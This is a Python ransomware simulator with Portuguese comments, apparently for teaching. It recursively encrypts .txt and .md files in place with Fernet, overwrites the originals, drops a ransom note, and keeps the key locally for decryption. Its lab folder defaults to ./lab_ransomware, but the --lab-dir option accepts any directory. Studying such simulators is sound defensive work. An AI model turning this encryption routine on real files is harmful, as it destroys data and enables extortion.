from __future__ import annotations

import argparse
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, List, Optional

from cryptography.fernet import Fernet, InvalidToken # pyright: ignore[reportMissingImports]


# =======================
#   PARTE DE CRIPTO
# =======================

class CryptoError(Exception):
    """Erro genérico de criptografia do simulador."""


def generate_key() -> bytes:
    """Gera uma nova chave simétrica (Fernet)."""
    return Fernet.generate_key()


def save_key(key: bytes, key_path: Path, overwrite: bool = False) -> None:
    """
    Salva a chave em um arquivo.

    Args:
        key: chave gerada por generate_key().
        key_path: caminho do arquivo que armazenará a chave.
        overwrite: se False, não sobrescreve um arquivo já existente.
    """
    key_path = key_path.resolve()

    if key_path.exists() and not overwrite:
        raise CryptoError(f"Arquivo de chave já existe: {key_path}")

    try:
        key_path.parent.mkdir(parents=True, exist_ok=True)
        with key_path.open("wb") as f:
            f.write(key)
    except OSError as exc:
        raise CryptoError(f"Falha ao salvar a chave em {key_path}") from exc


def load_key(key_path: Path) -> bytes:
    """
    Carrega a chave de um arquivo.

    Args:
        key_path: caminho do arquivo de chave.
    """
    key_path = key_path.resolve()
    if not key_path.exists():
        raise CryptoError(f"Arquivo de chave não encontrado: {key_path}")

    try:
        with key_path.open("rb") as f:
            return f.read()
    except OSError as exc:
        raise CryptoError(f"Falha ao ler a chave em {key_path}") from exc


def _build_fernet(key: bytes) -> Fernet:
    try:
        return Fernet(key)
    except Exception as exc:
        raise CryptoError("Chave inválida para Fernet.") from exc


def encrypt_file(file_path: Path, key: bytes, remove_plaintext: bool = True) -> None:
    """
    Criptografa um arquivo.

    Observação:
        Pensado para AMBIENTE DE LABORATÓRIO, com arquivos de teste.
        Nunca use em diretório do sistema ou dados reais.
    """
    file_path = file_path.resolve()

    if not file_path.is_file():
        raise CryptoError(f"Caminho não é um arquivo válido: {file_path}")

    fernet = _build_fernet(key)

    try:
        data = file_path.read_bytes()
    except OSError as exc:
        raise CryptoError(f"Falha ao ler arquivo: {file_path}") from exc

    token = fernet.encrypt(data)

    try:
        if remove_plaintext:
            file_path.write_bytes(token)
        else:
            enc_path = file_path.with_suffix(file_path.suffix + ".enc")
            enc_path.write_bytes(token)
    except OSError as exc:
        raise CryptoError(f"Falha ao escrever arquivo criptografado: {file_path}") from exc


def decrypt_file(file_path: Path, key: bytes, remove_ciphertext: bool = True) -> None:
    """
    Descriptografa um arquivo criptografado por Fernet.
    """
    file_path = file_path.resolve()

    if not file_path.is_file():
        raise CryptoError(f"Caminho não é um arquivo válido: {file_path}")

    fernet = _build_fernet(key)

    try:
        data = file_path.read_bytes()
    except OSError as exc:
        raise CryptoError(f"Falha ao ler arquivo: {file_path}") from exc

    try:
        plaintext = fernet.decrypt(data)
    except InvalidToken as exc:
        raise CryptoError(f"Token inválido ou chave errada para arquivo: {file_path}") from exc

    try:
        if remove_ciphertext:
            file_path.write_bytes(plaintext)
        else:
            dec_path = file_path.with_suffix(file_path.suffix + ".dec")
            dec_path.write_bytes(plaintext)
    except OSError as exc:
        raise CryptoError(f"Falha ao escrever arquivo descriptografado: {file_path}") from exc


def list_files_recursively(
    root: Path,
    extensions: Optional[Iterable[str]] = None,
) -> List[Path]:
    """
    Lista arquivos recursivamente a partir de um diretório raiz.
    """
    root = root.resolve()

    if not root.exists() or not root.is_dir():
        raise CryptoError(f"Diretório inválido: {root}")

    exts = {ext.lower() for ext in extensions} if extensions is not None else None

    result: List[Path] = []
    for path in root.rglob("*"):
        if path.is_file():
            if exts is None or path.suffix.lower() in exts:
                result.append(path)
    return result


# =======================
#   PARTE DO "RANSOMWARE"
# =======================

LAB_DEFAULT_DIR = Path("./lab_ransomware").resolve()
DEFAULT_KEY_PATH = LAB_DEFAULT_DIR / "secret.key"
DEFAULT_NOTE_PATH = LAB_DEFAULT_DIR / "ransom_note.txt"


@dataclass
class RansomwareSimulatorConfig:
    lab_dir: Path = LAB_DEFAULT_DIR
    key_path: Path = DEFAULT_KEY_PATH
    ransom_note_path: Path = DEFAULT_NOTE_PATH
    target_extensions: Iterable[str] = (".txt", ".md")


class RansomwareSimulator:
    """
    Simulador educacional de ransomware.

    - Trabalha apenas em um diretório de laboratório.
    - NÃO se auto-propaga, não é persistente, não é malware real.
    """

    def __init__(self, config: RansomwareSimulatorConfig | None = None) -> None:
        self.config = config or RansomwareSimulatorConfig()

    def init_lab_environment(self) -> None:
        """Cria arquivos de teste no diretório de laboratório."""
        lab = self.config.lab_dir
        lab.mkdir(parents=True, exist_ok=True)

        examples = {
            lab / "dados_confidenciais.txt": (
                "Esses são dados fictícios para o simulador de ransomware.\n"
                "NUNCA use isso em dados reais.\n"
            ),
            lab / "lembretes.md": (
                "# Lembretes (simulados)\n"
                "- Pagar a assinatura do antivírus.\n"
                "- Fazer backup dos arquivos importantes.\n"
            ),
        }

        for path, content in examples.items():
            if not path.exists():
                path.write_text(content, encoding="utf-8")

        print(f"Ambiente de laboratório inicializado em: {lab}")

    def create_ransom_note(self) -> None:
        """Cria uma 'nota de resgate' simulada."""
        note = self.config.ransom_note_path
        lab = self.config.lab_dir

        if not lab.exists():
            raise CryptoError("Diretório de laboratório não existe. Rode --init-lab primeiro.")

        message = (
            "*******************************\n"
            "*   SIMULADOR DE RANSOMWARE   *\n"
            "*******************************\n\n"
            "Seus arquivos de TESTE foram criptografados!\n"
            "Este é apenas um EXERCÍCIO EDUCACIONAL.\n\n"
            "Para recuperar os arquivos, execute no terminal:\n"
            "    python Untitled-1.py --decrypt\n\n"
            "Nunca execute algo assim em dados reais.\n"
        )

        note.write_text(message, encoding="utf-8")
        print(f"Ransom note criada em: {note}")

    def _ensure_key(self, overwrite: bool = False) -> None:
        """Gera e salva uma chave se não existir (ou se overwrite=True)."""
        key_path = self.config.key_path
        if key_path.exists() and not overwrite:
            print(f"Chave já existente em: {key_path}")
            return

        key = generate_key()
        save_key(key, key_path, overwrite=overwrite)
        print(f"Nova chave gerada e salva em: {key_path}")

    def encrypt_lab_files(self) -> None:
        """Criptografa arquivos do diretório de laboratório."""
        lab = self.config.lab_dir
        key_path = self.config.key_path

        if not lab.exists():
            raise CryptoError("Diretório de laboratório não existe. Rode --init-lab primeiro.")

        if not key_path.exists():
            print("Nenhuma chave encontrada. Gerando uma nova...")
            self._ensure_key(overwrite=False)

        key = load_key(key_path)
        files = list_files_recursively(lab, extensions=self.config.target_extensions)

        if not files:
            print("Nenhum arquivo de teste encontrado para criptografar.")
            return

        for file in files:
            try:
                encrypt_file(file, key)
                print(f"Arquivo criptografado: {file}")
            except CryptoError as exc:
                print(f"[ERRO] Falha ao criptografar {file}: {exc}")

        self.create_ransom_note()

    def decrypt_lab_files(self) -> None:
        """Descriptografa arquivos do diretório de laboratório."""
        lab = self.config.lab_dir
        key_path = self.config.key_path
        note_path = self.config.ransom_note_path

        if not lab.exists():
            raise CryptoError("Diretório de laboratório não existe.")
        if not key_path.exists():
            raise CryptoError("Arquivo de chave não encontrado. Não é possível descriptografar.")

        key = load_key(key_path)
        files = list_files_recursively(lab, extensions=self.config.target_extensions)

        if not files:
            print("Nenhum arquivo de teste encontrado para descriptografar.")
            return

        for file in files:
            # NÃO tentar descriptografar a ransom_note.txt
            if file.resolve() == note_path.resolve():
                continue

            try:
                decrypt_file(file, key)
                print(f"Arquivo descriptografado: {file}")
            except CryptoError as exc:
                print(f"[ERRO] Falha ao descriptografar {file}: {exc}")

        # Remover a nota de resgate se existir
        if note_path.exists():
            note_path.unlink()
            print(f"Ransom note removida: {note_path}")


# =======================
#   CLI
# =======================

def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Simulador educacional de ransomware.\n"
            "Use SOMENTE em um diretório de laboratório com arquivos de teste."
        )
    )
    parser.add_argument(
        "--lab-dir",
        type=Path,
        default=LAB_DEFAULT_DIR,
        help="Diretório de laboratório (padrão: ./lab_ransomware)",
    )
    parser.add_argument(
        "--key-path",
        type=Path,
        default=DEFAULT_KEY_PATH,
        help="Caminho do arquivo de chave (padrão: ./lab_ransomware/secret.key)",
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--init-lab", action="store_true", help="Cria arquivos de teste.")
    group.add_argument("--encrypt", action="store_true", help="Criptografa arquivos de teste.")
    group.add_argument("--decrypt", action="store_true", help="Descriptografa arquivos de teste.")
    return parser


def main() -> None:
    parser = build_arg_parser()
    args = parser.parse_args()

    config = RansomwareSimulatorConfig(
        lab_dir=args.lab_dir.resolve(),
        key_path=args.key_path.resolve(),
        ransom_note_path=(args.lab_dir.resolve() / "ransom_note.txt"),
    )
    simulator = RansomwareSimulator(config=config)

    try:
        if args.init_lab:
            simulator.init_lab_environment()
        elif args.encrypt:
            simulator.encrypt_lab_files()
        elif args.decrypt:
            simulator.decrypt_lab_files()
        else:
            parser.error("Use: --init-lab ou --encrypt ou --decrypt")
    except CryptoError as exc:
        print(f"[ERRO CRIPTOGRAFIA] {exc}")


if __name__ == "__main__":
    main()